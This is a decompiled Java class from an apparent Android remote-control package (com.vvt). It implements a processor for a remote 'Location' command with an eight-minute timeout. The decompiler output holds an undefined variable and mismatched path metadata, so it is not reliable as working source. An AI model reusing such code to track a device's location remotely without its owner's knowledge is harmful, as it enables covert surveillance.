package com.vvt.remotecommand.processor.c;

import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecontrol.RemoteControlException;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.a;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class b
  extends com.vvt.remotecommand.processor.b
{
  public b(a parama)
  {
    super(parama, true, localRemoteFunction);
  }
  
  protected String a(Object paramObject)
  {
    String str = null;
    boolean bool = paramObject instanceof RmtCtrlOutputStatusMessage;
    if (bool)
    {
      paramObject = (RmtCtrlOutputStatusMessage)paramObject;
      str = ((RmtCtrlOutputStatusMessage)paramObject).getMessage();
    }
    do
    {
      return str;
      bool = paramObject instanceof RemoteControlException;
    } while (!bool);
    throw ((RemoteControlException)paramObject);
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.INDIVIDUAL;
  }
  
  public String e()
  {
    return "Location";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 480000L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/MyUncaughtExceptionHandler/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */